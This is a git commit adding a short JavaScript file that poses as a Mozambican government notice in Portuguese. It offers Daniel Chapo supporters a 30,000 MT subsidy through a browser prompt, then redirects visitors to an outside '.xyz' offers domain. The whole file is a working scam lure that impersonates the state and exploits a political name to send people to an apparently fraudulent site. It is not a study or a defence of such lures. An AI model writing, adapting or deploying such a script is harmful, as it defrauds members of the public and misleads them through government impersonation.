8897260c62772200d133d4369feddd684da676ab
bigetijazz8 <bigetijazz8@gmail.com>
2024-10-27 00:52:57 -0700

    Create mzgrant.js

---
+++ mzgrant.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRADA 30,000 M T SUBVENÇÃO'
+password=prompt('REPÚBLICA DO MZ: Olá, está entre os Apoiantes Daniel Chapo selecionados para beneficiar desta oferta. Prima OK para receber uma oferta agora','RETIRADA 30,000 M T SUBVENÇÃO');
+if (password != 'RETIRADA 30,000 M T SUBVENÇÃO') {
+location.href='https://www.moreofferzdetails.xyz/15000mt';
+}
